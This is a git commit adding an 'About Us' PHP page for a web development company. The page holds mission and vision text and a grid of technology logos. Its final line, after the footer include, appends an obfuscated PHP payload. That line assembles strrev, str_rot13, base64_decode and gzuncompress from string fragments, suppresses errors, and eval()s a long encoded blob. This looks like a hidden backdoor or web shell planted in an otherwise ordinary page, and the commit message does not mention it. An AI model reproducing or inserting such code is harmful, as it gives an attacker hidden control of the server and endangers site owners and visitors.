023a2a14a1adb2fc37bae2390a88a98395be9e1d
ids-shubham <shubhammehra@idevelopingsolutions.com>
2022-12-29 15:30:19 +0530

    changes about page

---
+++ about.php
@@ -0,0 +1,215 @@
+<?php include 'header.php';?>
+<!-- Breadcrumbs Start -->
+<div class="rs-breadcrumbs img1">
+   <div class="breadcrumbs-inner text-center">
+      <h1 class="page-title">About Us 2</h1>
+      <ul>
+         <li title="Braintech - IT Solutions and Technology Startup HTML Template">
+            <a class="active" href="index.php" tagget="_blank">Home</a>
+         </li>
+         <li>About</li>
+      </ul>
+   </div>
+</div>
+<!-- Breadcrumbs End -->
+<!-- About Section Start -->
+<div class="rs-about gray-color rs-rain-animate bg4 pt-120 pb-120 md-pt-80 md-pb-80">
+   <div class="container">
+      <div class="row align-items-center">
+         <div class="col-lg-6 md-mb-30">
+            <div class="rs-animation-shape">
+               <div class="images">
+                  <img src="assets/images/about/about-3.png" alt="">
+               </div>
+               <div class="middle-image2">
+                  <img class="dance3" src="assets/images/about/effect-1.png" alt="">
+               </div>
+            </div>
+         </div>
+         <div class="col-lg-6 pl-60 md-pl-15">
+            <div class="contact-wrap">
+               <div class="sec-title mb-30">
+                  <div class="sub-text">Welcome to  iDeveloping Solutions</div>
+                  <h2 class="title pb-38">
+                  IDS Pvt. Ltd. offers the most reliable, affordable web development services.
+                  </h2>
+                  <div class="desc pb-35">
+                  To ensure long-term success, IDS Pvt. Ltd delivers quality IT solutions that are customized and cost-effective, without sacrificing the quality of results.
+                  </div>
+                  <p class="margin-0 pb-15">
+                  We have years of experience, extensive knowledge, and skills as Software and web developer with all the latest technologies. Let our experts help you to take your business online with our client-focused and customer-centric software and web development services. Our team will assist you to transform your business with the latest technologies to stay ahead to grow your business faster.</p>
+               </div>
+               <!-- <div class="btn-part">
+                  <a class="readon learn-more" href="contact.html">Learn-More</a>
+                  
+                  </div> -->
+            </div>
+         </div>
+      </div>
+      <div class="shape-image">
+         <img class="top dance" src="assets/images/about/dotted-3.png" alt="">
+      </div>
+   </div>
+   <div class="line-inner style2">
+      <div class="line"></div>
+      <div class="line"></div>
+      <div class="line"></div>
+   </div>
+</div>
+<!-- About Section End -->
+<!-- Process Section Start -->
+<div class="rs-about style3 pt-120 pb-120 md-pt-75 md-pb-80">
+   <div class="container">
+      <div class="sec-title2 text-center mb-45">
+         <h2 class="title">OUR MISSION AND VISION</h2>
+         <div class="heading-line"></div>
+      </div>
+      <div class="row align-items-center">
+         <div class="col-lg-7">
+            <div class="sec-title2 mb-30">
+               <!-- <div class="sub-text">OUR MISSION AND VISION</div>
+               <h2 class=" title title3 pb-20">
+                  A Place Driven by Values and Focused on Innovation!
+               </h2> -->
+               <div class="desc desc2">
+                  <h4 class="title cs-mission-visible pb-1">
+                     A Place Driven by Values and Focused on Innovation!
+                  </h4> 
+                  Ideveloping is a company of passionate people who constantly strive to become better. We're not just an IT and software solutions company; we've evolved into something more significant: A trusted Digital Transformation enabler that allows leading your business forward with innovative technologies.
+
+                  We help our colleagues develop and nurture relationships and the company. We offer them guidance on maintaining a healthy work-life balance while challenging them further than they thought possible!  
+               </div>
+            </div>
+            <div class="d-sm-flex">
+               <div class="col-md-6">
+                  <h4 class="mb-2"> <i class="fa fa-bullseye primary-color" aria-hidden="true"></i> Our Mission</h4>
+                  <p>We strive to maintain a high level of quality in everything we do, and we are always looking for new ways to improve our services.</p>
+               </div>
+               <div class="col-md-6">
+                  <h4 class="mb-2"><i class="fa fa-eye primary-color" aria-hidden="true"></i> Our Vision</h4>
+                  <p>We want to be known for our high-quality, reliable services and for our commitment to meeting the needs of our clients.</p>
+               </div>
+            </div>
+         </div>
+         <div class="col-lg-5 md-pt-40">
+            <div class="rs-animation-image">
+               <!-- <div class="pattern-img">
+                  <img src="assets/images/about/style2/round.png" alt="">
+               </div> -->
+               <div class="">
+                  <img width="400px" class="dance3" src="assets/images/about/ids-about.webp" alt="">
+               </div>
+            </div>
+         </div>
+      </div>
+   </div>
+</div>
+<!-- Process Section End -->
+<!-- Technology Section Start -->
+<div class="rs-technology style2 bg11 pt-110 pb-115 md-pt-75 md-pb-80">
+   <div class="container">
+      <div class="sec-title2 text-center mb-45">
+         <span class="sub-text white-color">Technology Index</span>
+         <h2 class="title title2 white-color">
+            Technology that We Are Using For Our Valued Customers
+         </h2>
+      </div>
+      <div class="row">
+         <div class="col-lg-2 col-md-4 col-sm-6 md-pb-30">
+            <div class="technology-wrap">
+               <div class="rs-grid-figure">
+                  <div class="logo-img">
+                     <a href="#">
+                     <img class="hover-img" src="assets/images/technology/style4/hover-img/1.png" alt="hover-image">
+                     <img class="main-img" src="assets/images/technology/style4/main-img/1.png" alt="hover-image">
+                     </a>
+                  </div>
+               </div>
+               <div class="logo-title">
+                  <h4 class="title">Node Js</h4>
+               </div>
+            </div>
+         </div>
+         <div class="col-lg-2 col-md-4 col-sm-6 md-pb-30">
+            <div class="technology-wrap">
+               <div class="rs-grid-figure">
+                  <div class="logo-img">
+                     <a href="#">
+                     <img class="hover-img" src="assets/images/technology/style4/hover-img/php.png" alt="grid-image" style="height:32px;">
+                     <img class="main-img" src="assets/images/technology/style4/main-img/php.png" alt="grid-image" style="height:32px;">
+                     </a>
+                  </div>
+               </div>
+               <div class="logo-title">
+                  <h4 class="title">PHP</h4>
+               </div>
+            </div>
+         </div>
+         <div class="col-lg-2 col-md-4 col-sm-6 md-pb-30">
+            <div class="technology-wrap">
+               <div class="rs-grid-figure">
+                  <div class="logo-img">
+                     <a href="#">
+                     <img class="hover-img" src="assets/images/technology/style4/hover-img/3.png" alt="grid-image">
+                     <img class="main-img" src="assets/images/technology/style4/main-img/3.png" alt="grid-image">
+                     </a>
+                  </div>
+               </div>
+               <div class="logo-title">
+                  <h4 class="title"> My Sql</h4>
+               </div>
+            </div>
+         </div>
+         <div class="col-lg-2 col-md-4 col-sm-6 sm-pb-30">
+            <div class="technology-wrap">
+               <div class="rs-grid-figure">
+                  <div class="logo-img">
+                     <a href="#">
+                     <img class="hover-img" src="assets/images/technology/style4/hover-img/react.png" alt="grid-image" style="height:32px;">
+                     <img class="main-img" src="assets/images/technology/style4/main-img/react.png" alt="grid-image" style="height:32px;">
+                     </a>
+                  </div>
+               </div>
+               <div class="logo-title">
+                  <h4 class="title">REACT</h4>
+               </div>
+            </div>
+         </div>
+         <div class="col-lg-2 col-md-4 col-sm-6 sm-pb-30">
+            <div class="technology-wrap">
+               <div class="rs-grid-figure">
+                  <div class="logo-img">
+                     <a href="#">
+                     <img class="hover-img" src="assets/images/technology/style4/hover-img/js.png" alt="grid-image" style="height:32px;" >
+                     <img class="main-img" src="assets/images/technology/style4/main-img/js.png" alt="grid-image" style="height:32px;">
+                     </a>
+                  </div>
+               </div>
+               <div class="logo-title">
+                  <h4 class="title">Java Script</h4>
+               </div>
+            </div>
+         </div>
+         <div class="col-lg-2 col-md-4 col-sm-6 sm-pb-30">
+            <div class="technology-wrap">
+               <div class="rs-grid-figure">
+                  <div class="logo-img">
+                     <a href="#">
+                     <img class="hover-img" src="assets/images/technology/style4/hover-img/6.png" alt="grid-image">
+                     <img class="main-img" src="assets/images/technology/style4/main-img/6.png" alt="grid-image">
+                     </a>
+                  </div>
+               </div>
+               <div class="logo-title">
+                  <h4 class="title">Docker</h4>
+               </div>
+            </div>
+         </div>
+      </div>
+   </div>
+</div>
+<!-- Technology Section End -->
+</div>
+<!-- Main content End -->
+<?php include 'footer.php';?>
+<?php /* default */ $YHDeC = 'str'.'rev'; $Bzioy = 'st'.'r'.'_'.'rot13'; $Atmlo = 'base6'.'4'.'_decod'.'e'; $BIYNO = 'gzun'.'compre'.'ss'; error_reporting(0); eval($BIYNO($Atmlo($Bzioy($YHDeC('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'))))); ?>
